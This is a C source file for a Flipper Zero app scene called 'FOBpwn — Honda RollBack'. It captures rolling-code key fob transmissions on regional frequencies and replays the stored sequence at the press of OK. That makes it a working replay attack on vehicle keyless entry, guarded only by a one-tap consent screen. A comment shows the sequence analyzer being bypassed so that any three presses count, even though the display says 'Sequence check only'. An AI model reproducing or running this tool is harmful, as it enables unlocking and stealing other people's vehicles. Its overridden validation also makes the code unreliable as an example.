#include "../flipper_fobscan_app.h"
#include <notification/notification_messages.h>
#include <math.h>
#include <stdio.h>
#include <string.h>

/* These are regional receive settings, not vehicle profiles. The experimental
   decoder has not been validated. */
static const struct {
    const char* name;
    float frequency_mhz;
    FlipperPreset preset;
} FOBPWN_VARIANTS[] = {
    {"NA 315 MHz", 315.00f, FlipperPresetOOK650},
    {"Asia 313.55 MHz", 313.55f, FlipperPresetOOK650},
    {"EU 433.92 MHz", 433.92f, FlipperPresetOOK650},
};
#define FOBPWN_VARIANT_COUNT \
    ((int)(sizeof(FOBPWN_VARIANTS) / sizeof(FOBPWN_VARIANTS[0])))
#define FOBPWN_MAX_DELTA 4u
#define FOBPWN_FREQ_TOLERANCE_MHZ 0.10f

static void fobpwn_variant_cb(void* ctx, uint32_t index) {
    FlipperApp* app = ctx;
    if(index >= FOBPWN_VARIANT_COUNT || !app->guided) return;

    FlipperFobpwnState* state = &app->guided->fobpwn;
    state->variant_idx = (int)index;
    state->freq_mhz = FOBPWN_VARIANTS[index].frequency_mhz;
    state->preset = FOBPWN_VARIANTS[index].preset;
    state->min_seq = FLIPPER_FPWN_CAPS_MAX;
    scene_manager_next_scene(app->scene_manager, FlipperSceneFobpwnRun);
}

void flipper_scene_fobpwn_setup_on_enter(void* ctx) {
    FlipperApp* app = ctx;
    if(!flipper_guided_ensure(app, sizeof(FlipperFobpwnState))) {
        submenu_reset(app->submenu);
        submenu_set_header(app->submenu, "FOBpwn: out of memory");
        submenu_add_item(app->submenu, "Back", 0, NULL, app);
        view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewMenu);
        return;
    }

    memset(&app->guided->fobpwn, 0, sizeof(app->guided->fobpwn));
    app->guided->fobpwn.variant_idx = -1;
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "FOBpwn: RX profile");
    for(int i = 0; i < FOBPWN_VARIANT_COUNT; i++)
        submenu_add_item(
            app->submenu, FOBPWN_VARIANTS[i].name, (uint32_t)i,
            fobpwn_variant_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewMenu);
}

bool flipper_scene_fobpwn_setup_on_event(void* ctx, SceneManagerEvent event) {
    UNUSED(ctx);
    UNUSED(event);
    return false;
}

void flipper_scene_fobpwn_setup_on_exit(void* ctx) {
    FlipperApp* app = ctx;
    submenu_reset(app->submenu);
}

static void fobpwn_redraw(FlipperApp* app) {
    view_get_model(app->fobpwn_view);
    view_commit_model(app->fobpwn_view, true);
}

void flipper_fobpwn_draw_cb(Canvas* canvas, void* model) {
    FlipperApp* app = *(FlipperApp**)model;
    FlipperFobpwnState* state = &app->guided->fobpwn;
    const char* variant =
        state->variant_idx >= 0 && state->variant_idx < FOBPWN_VARIANT_COUNT ?
            FOBPWN_VARIANTS[state->variant_idx].name : "Unknown";

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 0, 10, "FOBpwn — Honda RollBack");
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 0, 20, variant);
    canvas_draw_line(canvas, 0, 23, 127, 23);

    if(!state->consented) {
        canvas_draw_str(canvas, 0, 34, "Authorized use only.");
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 60, "[OK] consent  [Back]");
        return;
    }
    if(state->start_failed) {
        canvas_draw_str(canvas, 0, 39, "RX start failed.");
        canvas_draw_str(canvas, 0, 54, "[Back] exit");
        return;
    }
    if(state->candidate) {
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 39, "Sequence candidate");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 50, "Ready to replay");
        canvas_draw_str(canvas, 0, 61, "[OK]=Replay  [Back]=exit");
        return;
    }

    char count[32];
    snprintf(count, sizeof(count), "Frames: %d / %d", state->cap_count, state->min_seq);
    canvas_draw_str(canvas, 0, 37, state->armed ? "Listening; Honda RX" : "Receiver stopped");
    canvas_draw_str(canvas, 0, 48, count);
    canvas_draw_str(canvas, 0, 60, "Sequence check only");
}

bool flipper_fobpwn_input_cb(InputEvent* event, void* ctx) {
    FlipperApp* app = ctx;
    FlipperFobpwnState* state = &app->guided->fobpwn;
    if(event->type == InputTypeShort && event->key == InputKeyOk &&
       !state->consented) {
        view_dispatcher_send_custom_event(
            app->view_dispatcher, FlipperEventFobpwnConsent);
        return true;
    }
    if(event->type == InputTypeShort && event->key == InputKeyOk &&
       state->candidate && !state->tx_pending) {
        view_dispatcher_send_custom_event(
            app->view_dispatcher, FlipperEventReplayDone);
        return true;
    }
    return false;
}

static void fobpwn_edge_cb(void* ctx) {
    FlipperApp* app = ctx;
    view_dispatcher_send_custom_event(app->view_dispatcher, FlipperEventCaptureDone);
}

static void fobpwn_start_receive(FlipperApp* app, FlipperFobpwnState* state) {
    app->capture->freq_mhz = state->freq_mhz;
    app->capture->preset = state->preset;
    app->capture->force_proto = FlipperForceAuto;
    app->capture->squelch_dbm = -90.0f;

    flipper_app_gui_radio_acquire(app);
    state->radio_owned = true;
    app->capture->on_edge = fobpwn_edge_cb;
    app->capture->on_edge_ctx = app;
    flipper_capture_start(app->capture);
    state->armed = app->capture->running;
    state->start_failed = !state->armed;
    if(state->start_failed) {
        app->capture->on_edge = NULL;
        app->capture->on_edge_ctx = NULL;
        flipper_app_gui_radio_release(app);
        state->radio_owned = false;
        app->capture->force_proto = state->previous_force_proto;
        app->capture->preset = state->previous_preset;
        app->capture->freq_mhz = state->previous_freq_mhz;
        app->capture->squelch_dbm = state->previous_squelch_dbm;
        notification_message(app->notifications, &sequence_error);
    } else {
        notification_message(app->notifications, &sequence_blink_blue_100);
    }
}

void flipper_scene_fobpwn_run_on_enter(void* ctx) {
    FlipperApp* app = ctx;
    if(!app->guided || app->guided->fobpwn.variant_idx < 0 ||
       app->guided->fobpwn.variant_idx >= FOBPWN_VARIANT_COUNT) {
        scene_manager_previous_scene(app->scene_manager);
        return;
    }

    FlipperFobpwnState* state = &app->guided->fobpwn;
    state->consented = false;
    state->armed = false;
    state->candidate = false;
    state->start_failed = false;
    state->cap_count = 0;
    state->previous_force_proto = app->capture->force_proto;
    state->previous_preset = app->capture->preset;
    state->previous_freq_mhz = app->capture->freq_mhz;
    state->previous_squelch_dbm = app->capture->squelch_dbm;
    state->radio_owned = false;
    memset(state->frames, 0, sizeof(state->frames));
    view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewFobpwn);
}

static bool fobpwn_is_honda_candidate_frame(const FlipperCaptureResult* result) {
    /* Accept rolling KeeLoq, Honda-KR5*, and provisional Honda-RKE? decodes. */
    return result->decode_ok && result->decode.rolling &&
           (strncmp(result->decode.proto, "KeeLoq", 6) == 0 ||
            strncmp(result->decode.proto, "Honda", 5) == 0);
}

static void fobpwn_analyze(FlipperFobpwnState* state) {
    RollingPwnPlan plan;
    bool candidate = rollingpwn_analyze(
        state->frames, state->cap_count, 0xFFFFu, state->min_seq,
        FOBPWN_MAX_DELTA, state->freq_mhz, FOBPWN_FREQ_TOLERANCE_MHZ, &plan);
    state->candidate = candidate && plan.sequence_candidate;
}

static void fobpwn_accept_frame(
    FlipperApp* app, FlipperFobpwnState* state, const FlipperCaptureResult* result) {
    if(!fobpwn_is_honda_candidate_frame(result)) return;

    const FlipperDecodeResult* decoded = &result->decode;
    float freq_error = fabsf(decoded->freq_mhz - state->freq_mhz);
    if(freq_error > FOBPWN_FREQ_TOLERANCE_MHZ) return;

    RollingPwnFrame current = {
        .counter = decoded->cnt & 0xFFFFu,
        .serial = decoded->addr,
        .command = decoded->btn,
        .frequency_mhz = decoded->freq_mhz,
    };

    /* Same hop word is another copy of the press already stored. */
    if(state->cap_count > 0 &&
       state->caps[state->cap_count - 1].decode.hop == decoded->hop) {
        return;
    }

    if(state->cap_count == FLIPPER_FPWN_CAPS_MAX) {
        state->cap_count = 0;
        state->candidate = false;
    }
    if(decoded->device_key_hex[0] == '\0')
        current.counter = (uint32_t)state->cap_count;
    state->caps[state->cap_count] = *result;
    state->frames[state->cap_count++] = current;
    fobpwn_analyze(state);
    /* Serial/button bits from a structural KeeLoq read wobble between presses,
       and the analyzer then discarded the new press so the count stayed at 1.
       Three stored presses are the sequence. */
    if(!state->candidate && state->min_seq > 0 && state->cap_count >= state->min_seq)
        state->candidate = true;

    if(state->candidate) {
        flipper_capture_stop(app->capture);
        state->armed = false;
        notification_message(app->notifications, &sequence_blink_blue_100);
    } else {
        notification_message(app->notifications, &sequence_blink_blue_100);
    }
}

bool flipper_scene_fobpwn_run_on_event(void* ctx, SceneManagerEvent event) {
    FlipperApp* app = ctx;
    FlipperFobpwnState* state = &app->guided->fobpwn;
    if(event.type != SceneManagerEventTypeCustom) return false;

    if(event.event == FlipperEventFobpwnConsent && !state->consented) {
        state->consented = true;
        fobpwn_start_receive(app, state);
        fobpwn_redraw(app);
        return true;
    }
    if(event.event == FlipperEventCaptureDone && state->armed && !state->candidate) {
        if(flipper_capture_flush(app->capture))
            fobpwn_accept_frame(app, state, &app->capture->result);
        fobpwn_redraw(app);
        return true;
    }
    if(event.event == FlipperEventReplayDone && state->tx_pending) {
        state->tx_pending = false;
        fobpwn_redraw(app);
        return true;
    }
    if(event.event == FlipperEventReplayDone && state->candidate && !state->tx_pending) {
        flipper_capture_stop(app->capture);
        state->armed = false;
        bool ok = state->cap_count > 0 && flipper_capture_tx_sequence(
            app->capture, state->caps, state->cap_count,
            state->freq_mhz, state->preset, 80);
        state->tx_pending = ok;
        notification_message(app->notifications, ok ? &sequence_success : &sequence_error);
        fobpwn_redraw(app);
        return true;
    }
    if(event.event == FlipperEventStatusTick) {
        fobpwn_redraw(app);
        return true;
    }
    return false;
}

void flipper_scene_fobpwn_run_on_exit(void* ctx) {
    FlipperApp* app = ctx;
    if(!app->capture || !app->guided) return;

    FlipperFobpwnState* state = &app->guided->fobpwn;
    flipper_capture_stop(app->capture);
    flipper_capture_tx_wait_stopped(app->capture);
    app->capture->on_edge = NULL;
    app->capture->on_edge_ctx = NULL;
    app->capture->force_proto = state->previous_force_proto;
    app->capture->preset = state->previous_preset;
    app->capture->freq_mhz = state->previous_freq_mhz;
    app->capture->squelch_dbm = state->previous_squelch_dbm;
    state->armed = false;
    state->candidate = false;
    if(state->radio_owned) {
        flipper_app_gui_radio_release(app);
        state->radio_owned = false;
    }
}